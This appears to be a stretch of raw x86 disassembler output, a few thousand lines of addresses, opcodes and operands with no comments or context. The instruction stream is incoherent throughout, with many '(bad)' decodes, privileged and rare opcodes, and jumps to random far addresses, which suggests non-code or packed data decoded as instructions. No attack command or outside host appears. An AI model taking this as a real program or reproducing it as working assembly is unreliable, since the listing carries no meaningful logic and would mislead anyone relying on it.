  41d3e6:	shl    DWORD PTR [edx],1
  41d3e8:	cmp    dl,BYTE PTR [ebp-0x76]
  41d3eb:	push   ecx
  41d3ec:	adc    DWORD PTR [eax+ebx*4],edx
  41d3ef:	repz or al,0xe9
  41d3f2:	mov    dh,0x28
  41d3f4:	add    DWORD PTR [edx-0x4e],ecx
  41d3f7:	jle    0x41d430
  41d3f9:	xchg   esp,eax
  41d3fa:	std    
  41d3fb:	stos   BYTE PTR es:[di],al
  41d3fd:	sbb    cl,BYTE PTR [edx]
  41d3ff:	hlt    
  41d400:	dec    ebx
  41d401:	sub    esp,DWORD PTR [esi]
  41d403:	shr    BYTE PTR [edi-0x2b],0x8f
  41d407:	xchg   esp,eax
  41d408:	jb     0x41d428
  41d40a:	cwde   
  41d40b:	push   edi
  41d40c:	test   eax,0x629210aa
  41d411:	mov    eax,ds:0xce7d8ee3
  41d416:	dec    ebx
  41d417:	mov    edx,0x38ff8442
  41d41c:	fisubr DWORD PTR gs:[edi]
  41d41f:	icebp  
  41d420:	daa    
  41d421:	imul   eax,DWORD PTR [ecx-0x4d1b88ac],0xffffffbb
  41d428:	dec    edx
  41d429:	and    ecx,DWORD PTR [ebp-0xc]
  41d42c:	hlt    
  41d42d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d42e:	xchg   ebp,eax
  41d42f:	xlat   BYTE PTR ds:[ebx]
  41d430:	and    bh,cl
  41d432:	daa    
  41d433:	retf   
  41d434:	imul   ebp,DWORD PTR [esi],0xb634acb0
  41d43a:	js     0x41d496
  41d43c:	pusha  
  41d43d:	inc    DWORD PTR [esi]
  41d43f:	pushf  
  41d440:	pop    ebx
  41d441:	int3   
  41d442:	fs inc esp
  41d444:	pop    edi
  41d445:	sbb    edx,DWORD PTR [ecx]
  41d447:	jl     0x41d41b
  41d449:	das    
  41d44a:	cdq    
  41d44b:	push   0x2d
  41d44d:	pop    edi
  41d44e:	fsubr  DWORD PTR [esp+eiz*2]
  41d451:	lea    edi,[ecx+0xf]
  41d454:	jns    0x41d3fc
  41d456:	fdivrp st(2),st
  41d458:	sbb    BYTE PTR [ebx],bl
  41d45a:	repnz aam 0x71
  41d45d:	and    edi,esp
  41d45f:	call   0x78674b68
  41d464:	aaa    
  41d465:	popf   
  41d466:	push   esi
  41d467:	jmp    0xced91b85
  41d46c:	dec    ebp
  41d46d:	xlat   BYTE PTR ds:[ebx]
  41d46e:	pop    ds
  41d46f:	shr    dl,1
  41d471:	push   esp
  41d472:	loopne 0x41d4cf
  41d474:	push   esp
  41d475:	push   edx
  41d476:	push   ebp
  41d477:	push   ebp
  41d478:	mov    bl,0x72
  41d47a:	mov    ds:0x4a3eece0,eax
  41d47f:	repnz add bh,BYTE PTR [edx]
  41d482:	push   edx
  41d483:	sbb    ebx,ebp
  41d485:	cmp    eax,DWORD PTR [esi+ebp*2-0x72]
  41d489:	adc    DWORD PTR [edx-0x44],ebp
  41d48c:	fcomp  QWORD PTR [eax-0x22d00df8]
  41d492:	(bad)  
  41d493:	mov    bl,0xe4
  41d495:	das    
  41d496:	push   cs
  41d497:	sbb    eax,0xbf23a3d0
  41d49c:	sbb    BYTE PTR [esi+0x36bb87db],0x98
  41d4a3:	cwde   
  41d4a4:	pop    es
  41d4a5:	and    esp,ebx
  41d4a7:	lock scas eax,DWORD PTR es:[edi]
  41d4a9:	test   esp,ebx
  41d4ab:	push   0x3744ec3b
  41d4b0:	in     al,0xf1
  41d4b2:	retf   
  41d4b3:	lods   eax,DWORD PTR ds:[esi]
  41d4b4:	sbb    BYTE PTR [ebp+ecx*1-0x39],cl
  41d4b8:	ret    0x4761
  41d4bb:	ds cmp al,0x0
  41d4be:	add    BYTE PTR [eax],al
  41d4c0:	add    BYTE PTR [eax],al
  41d4c2:	loop   0x41d4ce
  41d4c4:	add    DWORD PTR [ecx+0x7bf29be9],edx
  41d4ca:	mov    ebp,0x975ff411
  41d4cf:	shl    ah,cl
  41d4d1:	add    eax,0x15034
  41d4d6:	repz add al,0x0
  41d4d9:	add    al,cl
  41d4db:	jae    0x41d496
  41d4dd:	mov    esp,0x91300150
  41d4e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4e3:	xor    eax,0x687bcf2b
  41d4e8:	sub    ecx,DWORD PTR [ebx-0x33]
  41d4eb:	call   0x197f:0xae7793ef
  41d4f2:	jle    0x41d4d3
  41d4f4:	xor    eax,0x96ef17e1
  41d4f9:	sbb    edx,eax
  41d4fb:	xor    BYTE PTR [esi+0x652562b3],dh
  41d501:	jmp    0xfcee:0x84422e81
  41d508:	lods   eax,DWORD PTR ds:[esi]
  41d509:	aas    
  41d50a:	shr    esp,0x7e
  41d50d:	pop    eax
  41d50e:	cmp    al,0xea
  41d510:	inc    ecx
  41d511:	sbb    al,0x12
  41d513:	jp     0x41d4cb
  41d515:	ret    0xc38c
  41d518:	ins    DWORD PTR es:[edi],dx
  41d519:	mov    ebp,0x63fd2bd5
  41d51e:	test   eax,0x46d20bd
  41d523:	fdivr  DWORD PTR [edx+0x3ea12c76]
  41d52a:	mov    edx,0x96c26d46
  41d52f:	std    
  41d530:	sub    eax,DWORD PTR [edx]
  41d532:	xlat   BYTE PTR ds:[ebx]
  41d533:	mov    BYTE PTR [ebp-0x3b],ch
  41d536:	and    BYTE PTR [ecx-0x1e6c6793],ah
  41d53c:	or     al,0xb4
  41d53e:	jne    0x41d599
  41d540:	cmp    DWORD PTR [ebp-0x59],edx
  41d543:	or     BYTE PTR ds:0x6f0b2e9c,bh
  41d549:	and    ebp,ecx
  41d54b:	cmp    al,0xb6
  41d54d:	lock xor DWORD PTR [eax+0x650a4861],0x61
  41d555:	mov    WORD PTR [eax+0x17],ss
  41d558:	sbb    BYTE PTR [eax-0x1e53452a],bl
  41d55e:	mov    ecx,0x5ed840fc
  41d563:	mov    ecx,0x3ef43317
  41d568:	js     0x41d5a1
  41d56a:	mul    BYTE PTR [eax]
  41d56c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d56d:	das    
  41d56e:	lea    esp,[ecx-0x40b99e4f]
  41d574:	jmp    0xd645:0x63b2a6ad
  41d57b:	dec    esp
  41d57c:	adc    dl,BYTE PTR ds:0xa9294638
  41d582:	mov    DWORD PTR [esi],edi
  41d584:	je     0x41d5ef
  41d586:	cdq    
  41d587:	jg     0x41d5cb
  41d589:	int    0x23
  41d58b:	mov    ebp,DWORD PTR [ebp-0x34c70a6d]
  41d591:	push   eax
  41d592:	push   ebp
  41d593:	sbb    ah,BYTE PTR [ebx-0x5c]
  41d596:	leave  
  41d597:	xor    edx,0x91d959ca
  41d59d:	js     0x41d592
  41d59f:	xchg   DWORD PTR [ebx+0x46735b33],esp
  41d5a5:	jmp    0x57340eca
  41d5aa:	mov    esi,0x905ccdcd
  41d5af:	daa    
  41d5b0:	sbb    al,BYTE PTR [edx]
  41d5b2:	pop    ebx
  41d5b3:	mov    WORD PTR [ecx-0x3c7097b6],ss
  41d5b9:	ret    0x4c1b
  41d5bc:	fidivr WORD PTR [edi-0x356f8a51]
  41d5c2:	les    esi,FWORD PTR ds:0xfac7f15e
  41d5c8:	(bad)  [esi]
  41d5ca:	repz jns 0x41d5a6
  41d5cd:	mov    bh,0x30
  41d5cf:	pop    edx
  41d5d0:	xor    al,BYTE PTR [ebx-0x40]
  41d5d3:	loope  0x41d55b
  41d5d5:	mov    eax,0xe16901d9
  41d5da:	jle    0x41d5db
  41d5dc:	or     ch,al
  41d5de:	cmp    dl,cl
  41d5e0:	jmp    0x3ac1617e
  41d5e5:	adc    eax,DWORD PTR [ebx-0x16]
  41d5e8:	gs jnp 0x41d5cd
  41d5eb:	shl    DWORD PTR [ecx+0x7893b223],0x72
  41d5f2:	arpl   WORD PTR [ecx],dx
  41d5f4:	mov    al,ds:0xa165712d
  41d5f9:	mov    esp,es
  41d5fb:	xchg   esp,eax
  41d5fc:	adc    BYTE PTR [edi-0x1d9f794f],bl
  41d602:	popa   
  41d603:	call   0xa3a4:0x464dd2fe
  41d60a:	xor    BYTE PTR [eax-0x78597a34],bh
  41d610:	dec    edi
  41d611:	stos   BYTE PTR es:[edi],al
  41d612:	repnz fs shl esp,1
  41d616:	into   
  41d617:	xor    ah,BYTE PTR [edx]
  41d619:	sub    BYTE PTR [eax-0x74],bl
  41d61c:	lahf   
  41d61d:	bound  ebx,QWORD PTR [esi-0x69]
  41d620:	call   0xf7e1eeb2
  41d625:	loopne 0x41d5b7
  41d627:	in     eax,dx
  41d628:	push   eax
  41d629:	outs   dx,BYTE PTR ds:[esi]
  41d62a:	inc    edi
  41d62b:	dec    ebx
  41d62c:	out    dx,eax
  41d62d:	(bad)  
  41d62e:	mov    fs,WORD PTR [edx+0x2ea94887]
  41d634:	sar    BYTE PTR [ebp+0xb],1
  41d637:	jae    0x41d633
  41d639:	xchg   esi,eax
  41d63a:	pop    ebx
  41d63b:	ret    
  41d63c:	jae    0x41d65d
  41d63e:	in     al,0x54
  41d640:	cmp    eax,eax
  41d642:	lods   al,BYTE PTR ds:[esi]
  41d643:	adc    eax,0xfdcbaf43
  41d648:	fsub   QWORD PTR [edi-0x4f5d130d]
  41d64e:	ins    BYTE PTR es:[edi],dx
  41d64f:	or     BYTE PTR [ebp-0x27],bl
  41d652:	mov    esp,0xed8ac7ad
  41d657:	fnstsw WORD PTR [edx+0xe507114]
  41d65d:	mov    bl,0x2d
  41d65f:	ret    
  41d660:	jle    0x41d61a
  41d662:	xchg   edi,eax
  41d663:	push   ss
  41d664:	or     BYTE PTR [eax+0x2c882cdd],bl
  41d66a:	stos   BYTE PTR es:[edi],al
  41d66b:	pop    edi
  41d66c:	daa    
  41d66d:	outs   dx,DWORD PTR ds:[si]
  41d66f:	sub    al,0x9
  41d671:	mov    eax,0x9f6f687c
  41d676:	dec    ebx
  41d677:	in     al,dx
  41d678:	and    al,0x79
  41d67a:	sub    al,al
  41d67c:	mov    edi,0x9a1a4b8b
  41d681:	dec    esi
  41d682:	mov    edi,0xfbafc7cf
  41d687:	ret    0x3d23
  41d68a:	xor    DWORD PTR [ebp+0x75c76235],ebp
  41d690:	mov    ds:0x739ef93b,al
  41d695:	pop    edx
  41d696:	imul   eax,DWORD PTR [esi-0x525c713c],0xffffffe8
  41d69d:	das    
  41d69e:	sub    BYTE PTR [ecx+0x68],al
  41d6a1:	shr    BYTE PTR [edi-0x4aaa942c],0x1b
  41d6a8:	dec    ecx
  41d6a9:	mov    WORD PTR [ebx+0x28ff17c2],cs
  41d6af:	test   al,dl
  41d6b1:	add    cl,dl
  41d6b3:	pop    ds
  41d6b4:	sub    BYTE PTR [ebp+0x697f17e2],0x10
  41d6bb:	pop    edi
  41d6bc:	(bad)  
  41d6bd:	fstp   TBYTE PTR [esp+eiz*4]
  41d6c0:	ret    0xdc0e
  41d6c3:	and    eax,0x74d9a0de
  41d6c8:	add    eax,0x4424b036
  41d6cd:	frstor [eax]
  41d6cf:	jmp    0x2e6e875
  41d6d4:	inc    eax
  41d6d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6d6:	adc    eax,0xd0f3ed4b
  41d6db:	dec    esi
  41d6dc:	outs   dx,BYTE PTR ds:[esi]
  41d6dd:	mov    bl,0xa8
  41d6df:	jb     0x41d725
  41d6e1:	cmp    edx,DWORD PTR [edx]
  41d6e3:	lock jno 0x41d6cc
  41d6e6:	in     al,0xed
  41d6e8:	adc    al,0xf
  41d6ea:	mov    esi,0xe69b3491
  41d6ef:	jnp    0x41d740
  41d6f1:	pop    ebx
  41d6f2:	jl     0x41d6d5
  41d6f4:	and    ah,BYTE PTR [ebp+0x2]
  41d6f7:	sbb    esp,ebx
  41d6f9:	sar    BYTE PTR [edx-0x481ceba2],0x91
  41d700:	or     eax,0x4b2d5922
  41d705:	loopne 0x41d730
  41d707:	retf   
  41d708:	cld    
  41d709:	xor    al,0x7
  41d70b:	std    
  41d70c:	jecxz  0x41d6f9
  41d70e:	loopne 0x41d706
  41d710:	(bad)  
  41d711:	bnd call 0x88c88c72
  41d717:	pop    eax
  41d718:	pop    ecx
  41d719:	inc    eax
  41d71a:	out    dx,al
  41d71b:	jmp    0x92af264b
  41d720:	xchg   esi,eax
  41d721:	pop    es
  41d722:	pop    edi
  41d723:	xchg   esp,ebx
  41d725:	add    al,0x4b
  41d727:	lods   al,BYTE PTR ds:[esi]
  41d728:	xchg   ebx,eax
  41d729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d72a:	push   esp
  41d72b:	add    bh,bh
  41d72d:	std    
  41d72e:	aas    
  41d72f:	hlt    
  41d730:	outs   dx,DWORD PTR ds:[esi]
  41d731:	push   DWORD PTR [edx]
  41d733:	and    ebp,DWORD PTR [eax]
  41d735:	mov    edx,0x36a2cf2b
  41d73a:	ret    
  41d73b:	dec    ecx
  41d73c:	mov    esi,0x7223faa5
  41d741:	pop    eax
  41d742:	call   0x6c35:0x5a6bd4b
  41d749:	enter  0x2433,0x52
  41d74d:	inc    edx
  41d74e:	aam    0x52
  41d750:	pop    es
  41d751:	fiadd  WORD PTR [ecx]
  41d753:	adc    eax,0x750bdda0
  41d758:	imul   esi,DWORD PTR [edx-0x1bd2c301],0x10e84f81
  41d762:	mov    bh,0x37
  41d764:	scas   al,BYTE PTR es:[edi]
  41d765:	test   BYTE PTR [ecx+0x4e61384b],al
  41d76b:	test   eax,0x169580d4
  41d770:	mov    ds:0x904078f1,al
  41d775:	jne    0x41d730
  41d777:	fwait
  41d778:	repnz stos BYTE PTR es:[edi],al
  41d77a:	inc    eax
  41d77b:	push   ebx
  41d77c:	bound  esi,QWORD PTR [ebx+0x16]
  41d77f:	ror    BYTE PTR [ecx+0x7b],cl
  41d782:	ss (bad) 
  41d785:	scas   al,BYTE PTR es:[edi]
  41d786:	pop    ebx
  41d787:	mov    ebp,0x62d17534
  41d78c:	iret   
  41d78d:	xor    ebx,DWORD PTR [edi+0x1d]
  41d790:	out    0x7a,eax
  41d792:	cmp    esi,DWORD PTR [esi+0x4a6ba654]
  41d798:	mov    bh,0x79
  41d79a:	add    al,0x78
  41d79c:	mov    cl,ch
  41d79e:	mov    eax,edx
  41d7a0:	push   0xad79c2f5
  41d7a5:	dec    ebp
  41d7a6:	dec    ebp
  41d7a7:	imul   esi,DWORD PTR [eax],0xe5ab4192
  41d7ad:	idiv   DWORD PTR [edi+0x3e]
  41d7b0:	rcr    BYTE PTR [bp-0x53],cl
  41d7b4:	rol    DWORD PTR [edx],0x12
  41d7b7:	mov    ebx,0xbbc58e83
  41d7bc:	inc    ebp
  41d7bd:	pop    ss
  41d7be:	mov    DWORD PTR [esi+0x53],ebx
  41d7c1:	sti    
  41d7c2:	mov    ebp,0x67272e91
  41d7c7:	cmc    
  41d7c8:	call   0x8662:0xcefda6af
  41d7cf:	pop    edx
  41d7d0:	stc    
  41d7d1:	mov    DWORD PTR [edi+ebx*4-0x6eb5b4f4],edx
  41d7d8:	cmp    eax,DWORD PTR [edi-0x4a]
  41d7db:	cmp    al,BYTE PTR [si-0x745a]
  41d7e0:	adc    esp,DWORD PTR [esi+0x5d3b712d]
  41d7e6:	and    BYTE PTR [esi+0x2b676398],dl
  41d7ec:	lods   eax,DWORD PTR ds:[esi]
  41d7ed:	mov    dl,0x15
  41d7ef:	fstp   QWORD PTR [edi+0x4c6ddd43]
  41d7f5:	sahf   
  41d7f6:	xor    dl,dh
  41d7f8:	pop    ss
  41d7f9:	mov    DWORD PTR [ebx+ecx*2-0x5a],ebp
  41d7fd:	retf   
  41d7fe:	jmp    0x41d819
  41d800:	shl    BYTE PTR [edi],cl
  41d802:	dec    ecx
  41d803:	sbb    BYTE PTR [esi],0x5c
  41d806:	(bad)  
  41d807:	stc    
  41d808:	xor    al,0xaa
  41d80a:	les    ebx,FWORD PTR [eax+ebx*2]
  41d80d:	jns    0x41d872
  41d80f:	in     al,dx
  41d810:	mov    ch,0xad
  41d812:	dec    eax
  41d813:	sub    al,0x56
  41d815:	push   cs
  41d816:	imul   ebx,DWORD PTR [ebp*8+0x2c90616b],0xffffffb3
  41d81e:	stos   BYTE PTR es:[edi],al
  41d81f:	mov    al,0x8f
  41d821:	xor    DWORD PTR ds:0xa7b51978,ecx
  41d827:	mov    edi,0x3549da54
  41d82c:	outs   dx,DWORD PTR ds:[esi]
  41d82d:	push   ebx
  41d82e:	push   0x16898e0f
  41d833:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d834:	mov    dl,0xe4
  41d836:	and    DWORD PTR es:[esi-0x328d6f5d],ecx
  41d83d:	out    dx,eax
  41d83e:	mov    cl,0x2f
  41d840:	retf   0xb79c
  41d843:	fst    DWORD PTR [ecx+0x53]
  41d846:	test   eax,0x8f4b72bb
  41d84b:	inc    edx
  41d84c:	cmp    BYTE PTR [ebx-0x2a82160e],dh
  41d852:	and    dl,ah
  41d854:	jo     0x41d848
  41d856:	iret   
  41d857:	push   edi
  41d858:	push   0x34
  41d85a:	rcr    BYTE PTR [edi-0x10039ce4],0x7c
  41d861:	xchg   ebx,eax
  41d862:	ss xor al,0x76
  41d865:	cdq    
  41d866:	mov    ebp,0x1aac5092
  41d86b:	(bad)  
  41d86c:	fst    QWORD PTR [ebx+ecx*4-0x612a1802]
  41d873:	ret    
  41d874:	ja     0x41d841
  41d876:	push   esp
  41d877:	outs   dx,DWORD PTR ds:[esi]
  41d878:	adc    eax,0x29305da3
  41d87d:	(bad)  
  41d87e:	jecxz  0x41d89a
  41d880:	mov    ds:0x34b5e1b,al
  41d885:	ret    
  41d886:	sti    
  41d887:	stc    
  41d888:	jns    0x41d8d6
  41d88a:	jle    0x41d8d3
  41d88c:	or     cl,ah
  41d88e:	icebp  
  41d88f:	cmp    DWORD PTR [eax+0xfcc318b],0x1b
  41d896:	and    esp,0x9ad35bb7
  41d89c:	mov    dl,ch
  41d89e:	xor    DWORD PTR [eax],ecx
  41d8a0:	xchg   edx,ebp
  41d8a2:	pop    ebp
  41d8a3:	stos   BYTE PTR es:[edi],al
  41d8a4:	jae    0x41d8c9
  41d8a6:	mov    dh,0x6b
  41d8a8:	adc    eax,0xf531c054
  41d8ad:	adc    DWORD PTR [ecx+0x6d6d1703],ebp
  41d8b3:	jne    0x41d8ac
  41d8b5:	dec    ecx
  41d8b6:	scas   al,BYTE PTR es:[edi]
  41d8b7:	dec    ebx
  41d8b8:	aas    
  41d8b9:	inc    eax
  41d8ba:	lods   eax,DWORD PTR ds:[esi]
  41d8bb:	mov    ah,0x65
  41d8bd:	xchg   edi,eax
  41d8be:	jmp    0xec47602a
  41d8c3:	inc    eax
  41d8c4:	mov    ebx,0x565f3fd8
  41d8c9:	sbb    ch,BYTE PTR [eax-0xa9e4279]
  41d8cf:	dec    ebx
  41d8d0:	pop    edi
  41d8d1:	in     eax,0xd2
  41d8d3:	dec    edi
  41d8d4:	shl    dl,0x46
  41d8d7:	sbb    eax,0x2da363c4
  41d8dc:	sti    
  41d8dd:	cs cli 
  41d8df:	fldcw  WORD PTR [edx]
  41d8e1:	and    BYTE PTR [bp+si-0x3c],dl
  41d8e5:	out    dx,eax
  41d8e6:	sub    eax,0x29f2a79d
  41d8eb:	addr16 push 0x3c
  41d8ee:	std    
  41d8ef:	jnp    0x41d8f4
  41d8f1:	pop    eax
  41d8f2:	push   0x1e16387
  41d8f7:	arpl   WORD PTR [ebx],bx
  41d8f9:	das    
  41d8fa:	adc    eax,0xa326801b
  41d8ff:	sub    DWORD PTR [ebx],ecx
  41d901:	ss test eax,0x2f098600
  41d907:	test   eax,0xdaadfd5d
  41d90c:	mov    eax,0x37d0edcd
  41d911:	pop    edi
  41d912:	sub    esi,DWORD PTR [esi+eax*4-0xd]
  41d916:	push   ss
  41d917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d918:	cmp    al,0xf9
  41d91a:	cmp    eax,0x27acde97
  41d91f:	and    al,0x74
  41d921:	ror    BYTE PTR [esi-0x7],cl
  41d924:	in     eax,dx
  41d925:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d927:	mov    eax,0x11bdb0ef
  41d92c:	pop    eax
  41d92d:	xchg   edi,eax
  41d92f:	scas   al,BYTE PTR es:[edi]
  41d930:	sbb    ebp,DWORD PTR [ebp+0x56]
  41d933:	sub    bl,BYTE PTR [ebx+0x67]
  41d936:	mov    bl,0xb5
  41d938:	mov    bh,0xc1
  41d93a:	pop    ebx
  41d93b:	inc    ebp
  41d93c:	sbb    al,0xb2
  41d93e:	aam    0x8c
  41d940:	hlt    
  41d941:	jo     0x41d919
  41d943:	cmp    edx,eax
  41d945:	xchg   edx,eax
  41d946:	mov    esi,fs
  41d948:	mov    al,ds:0x46dc7fb9
  41d94d:	(bad)  
  41d94e:	add    BYTE PTR [esi],dl
  41d950:	cmp    DWORD PTR [edx-0x2b],ebp
  41d953:	jg     0x41d975
  41d955:	add    al,0x9f
  41d957:	mov    bl,0x32
  41d959:	mov    edx,0xca6ce45c
  41d95e:	pop    ebx
  41d95f:	push   ds
  41d960:	inc    edi
  41d961:	lahf   
  41d962:	(bad)  
  41d963:	pushf  
  41d964:	dec    eax
  41d965:	lock test al,0xb
  41d968:	mov    ds:0xa0e05150,eax
  41d96d:	sbb    BYTE PTR [ecx],dh
  41d96f:	push   esi
  41d970:	and    al,0x1a
  41d972:	dec    ecx
  41d973:	fcomp  QWORD PTR [ecx+edx*8+0x24]
  41d977:	mov    edi,0x3a6967c9
  41d97c:	fstp   DWORD PTR [ebx]
  41d97e:	adc    dh,BYTE PTR [edx+0x10]
  41d981:	xor    eax,edi
  41d983:	push   0xfffffffd
  41d985:	push   0xd9d6221c
  41d98a:	not    DWORD PTR [ecx+0x2c59611b]
  41d990:	imul   esp,DWORD PTR [ecx+0x39],0x49c89359
  41d997:	xor    BYTE PTR [edx-0x170f8842],ch
  41d99d:	cmp    dh,dl
  41d99f:	lods   al,BYTE PTR ds:[esi]
  41d9a0:	or     bl,BYTE PTR [ebp+0x438788dd]
  41d9a6:	rcl    BYTE PTR [esi],0xd4
  41d9a9:	adc    ah,BYTE PTR [esi-0x33]
  41d9ac:	sbb    DWORD PTR [ebx+eax*8],0xffffffd1
  41d9b0:	and    eax,0xde0e3f1c
  41d9b5:	jns    0x41da2b
  41d9b7:	enter  0xd6e2,0x87
  41d9bb:	mov    edx,ds
  41d9bd:	int    0xa5
  41d9bf:	out    0xac,eax
  41d9c1:	sbb    al,0xfd
  41d9c3:	pop    edi
  41d9c4:	ins    DWORD PTR es:[edi],dx
  41d9c5:	inc    esp
  41d9c6:	sbb    bl,BYTE PTR [ebx+0x5b]
  41d9c9:	imul   BYTE PTR [edx]
  41d9cb:	cli    
  41d9cc:	mov    WORD PTR [eax],es
  41d9ce:	add    BYTE PTR [eax],al
  41d9d0:	add    BYTE PTR [eax],al
  41d9d2:	pop    esi
  41d9d3:	pop    esi
  41d9d4:	loope  0x41da44
  41d9d6:	loope  0x41d9d7
  41d9d8:	fistp  QWORD PTR [esi-0x6e]
  41d9db:	adc    DWORD PTR [esi],0xa
  41d9de:	inc    eax
  41d9df:	jl     0x41d9a8
  41d9e1:	push   edi
  41d9e2:	daa    
  41d9e3:	push   ebp
  41d9e4:	add    DWORD PTR [eax],eax
  41d9e6:	repz add al,0x0
  41d9e9:	add    BYTE PTR [edi-0x1d],dl
  41d9ec:	rcr    esp,cl
  41d9ee:	clc    
  41d9ef:	jge    0x41da04
  41d9f1:	aad    0xab
  41d9f3:	hlt    
  41d9f4:	add    BYTE PTR [ecx-0xb],ah
  41d9f7:	stos   DWORD PTR es:[edi],eax
  41d9f8:	pop    ebp
  41d9f9:	or     bh,0x86
  41d9fc:	pop    ecx
  41d9fd:	jmp    0x371193a2
  41da02:	aad    0xc3
  41da04:	rol    BYTE PTR [esi+0x59702ca1],1
  41da0a:	outs   dx,DWORD PTR ds:[esi]
  41da0b:	std    
  41da0c:	add    edx,DWORD PTR [esi]
  41da0e:	int3   
  41da0f:	popa   
  41da10:	arpl   ax,ax
  41da12:	mov    dl,0xde
  41da14:	test   DWORD PTR [edx+0x4d],0x675c8c6b
  41da1b:	jmp    0xb180:0x129ad262
  41da22:	call   0x1ccf915c
  41da27:	sbb    DWORD PTR [ebp+0x3d],edx
  41da2a:	xor    al,0x64
  41da2c:	push   es
  41da2d:	and    eax,0xfc28dff7
  41da32:	ret    
  41da33:	sbb    bh,ah
  41da35:	xchg   ebx,eax
  41da36:	xor    BYTE PTR [ecx],bl
  41da38:	push   ss
  41da39:	or     bl,BYTE PTR [esi+0x76]
  41da3c:	(bad)
  41da3f:	and    cl,BYTE PTR [ecx-0x78]
  41da42:	inc    ecx
  41da43:	sbb    BYTE PTR [eax],bh
  41da45:	call   0xa5cb7111
  41da4a:	iret   
  41da4b:	std    
  41da4c:	cmp    ch,ch
  41da4e:	stos   BYTE PTR es:[edi],al
  41da4f:	jle    0x41daa5
  41da51:	repnz or edx,edx
  41da54:	div    esi
  41da56:	xchg   ebp,eax
  41da57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da58:	rcr    BYTE PTR [edi],cl
  41da5a:	add    eax,0x177bd939
  41da5f:	sub    edx,DWORD PTR [edi]
  41da61:	and    ah,BYTE PTR [ebx-0x36]
  41da64:	push   es
  41da65:	push   edi
  41da66:	inc    esp
  41da67:	cmp    eax,0xaacf2033
  41da6c:	or     al,0x2e
  41da6e:	jb     0x41d9fe
  41da70:	repnz adc esp,esi
  41da73:	xchg   DWORD PTR [ebx-0x6000ba42],esp
  41da79:	dec    edi
  41da7a:	mov    edi,0xc1137163
  41da7f:	sub    DWORD PTR [edi+0x29f9d092],ecx
  41da85:	xor    esi,ebp
  41da87:	adc    cl,BYTE PTR [esi]
  41da89:	out    0x22,al
  41da8b:	inc    ebp
  41da8c:	or     DWORD PTR [edx-0x4803b4eb],ecx
  41da92:	retf   
  41da93:	loope  0x41db04
  41da95:	jecxz  0x41daed
  41da97:	and    cl,BYTE PTR [ecx-0x51c308a0]
  41da9d:	push   ecx
  41da9e:	pushf  
  41da9f:	mov    eax,ds:0x7a544263
  41daa4:	mov    dl,0x82
  41daa6:	mov    dh,0xae
  41daa8:	sub    eax,0x14e12659
  41daad:	rcr    DWORD PTR [esi+0x8],cl
  41dab0:	push   ds
  41dab1:	cvtpi2ps xmm2,mm0
  41dab4:	gs inc eax
  41dab6:	rcr    DWORD PTR [edx-0x23],0xd4
  41daba:	ss ja  0x41da4b
  41dabd:	fwait
  41dabe:	jmp    0x41da56
  41dac0:	add    ch,BYTE PTR [ecx-0x43]
  41dac3:	inc    edx
  41dac4:	(bad)  
  41dac5:	cmp    BYTE PTR [ebx],ch
  41dac7:	test   al,0x28
  41dac9:	dec    ebp
  41daca:	lock sub BYTE PTR [edi],dl
  41dacd:	test   BYTE PTR [ebx+0x71],cl
  41dad0:	xchg   ecx,eax
  41dad1:	inc    esi
  41dad2:	jno    0x41db46
  41dad4:	sub    ebp,DWORD PTR [eax-0x18b529d0]
  41dada:	lahf   
  41dadb:	jecxz  0x41da68
  41dadd:	(bad)  
  41dade:	imul   eax,esp,0xffffffd3
  41dae1:	adc    BYTE PTR ss:[ebx+0x470b16f2],cl
  41dae8:	or     eax,0x1152eed0
  41daed:	adc    BYTE PTR [ebp-0xd],cl
  41daf0:	mov    ds:0x4ada319c,eax
  41daf5:	loope  0x41dad2
  41daf7:	jns    0x41dab6
  41daf9:	lods   al,BYTE PTR ds:[esi]
  41dafa:	fcomp  QWORD PTR [ecx-0x66]
  41dafd:	dec    esi
  41dafe:	xor    BYTE PTR [eax+0x46663158],bh
  41db04:	pop    esi
  41db05:	cmp    BYTE PTR [eax-0x5c240765],dl
  41db0b:	cmp    BYTE PTR [edx-0x38],0x89
  41db0f:	rol    DWORD PTR [edi+0x4c],cl
  41db12:	lock sub BYTE PTR [edi+0x2250e6f2],ch
  41db19:	inc    ecx
  41db1a:	dec    ebp
  41db1b:	sbb    eax,ebp
  41db1d:	das    
  41db1e:	cld    
  41db1f:	jb     0x41db5c
  41db21:	push   es
  41db22:	pop    esi
  41db23:	lea    edi,[ebp-0x50]
  41db26:	(bad)
  41db29:	dec    esi
  41db2a:	hlt    
  41db2b:	aaa    
  41db2c:	call   0x41618611
  41db31:	dec    edi
  41db32:	test   cl,dl
  41db34:	jnp    0x41dadf
  41db36:	icebp  
  41db37:	sub    ecx,DWORD PTR [ebp+0x3]
  41db3a:	sub    al,0xce
  41db3c:	cwde   
  41db3d:	cmc    
  41db3e:	mov    DWORD PTR [ebx+0x711fd3b5],ebp
  41db44:	cmp    eax,0x15bf0536
  41db49:	cmp    ch,BYTE PTR [ecx+0x2021d393]
  41db4f:	and    eax,0x70b0aa9c
  41db54:	add    DWORD PTR [ebp+0x68],0x48c79d94
  41db5b:	xchg   DWORD PTR [ebx-0x71],eax
  41db5e:	jmp    0x83b7:0x135f2845
  41db65:	jle    0x41db85
  41db67:	jo     0x41db89
  41db69:	cmp    BYTE PTR [ebp+eiz*8-0x47],ch
  41db6d:	out    0x40,eax
  41db6f:	lock pop ds
  41db71:	inc    ebp
  41db72:	rol    DWORD PTR [edx],0xef
  41db75:	ror    DWORD PTR [edx+0x7c842bd2],0x9a
  41db7c:	pop    ebp
  41db7d:	and    dl,BYTE PTR [edx-0x35]
  41db80:	cmp    esp,ebx
  41db82:	pushf  
  41db83:	loopne 0x41db09
  41db85:	inc    esi
  41db86:	jo     0x41db58
  41db88:	fisub  DWORD PTR [ebx+0x7353e09d]
  41db8e:	mov    ecx,0x1924a026
  41db93:	cmc    
  41db94:	mov    esi,0xaadbbe27
  41db99:	sbb    BYTE PTR [esi],ch
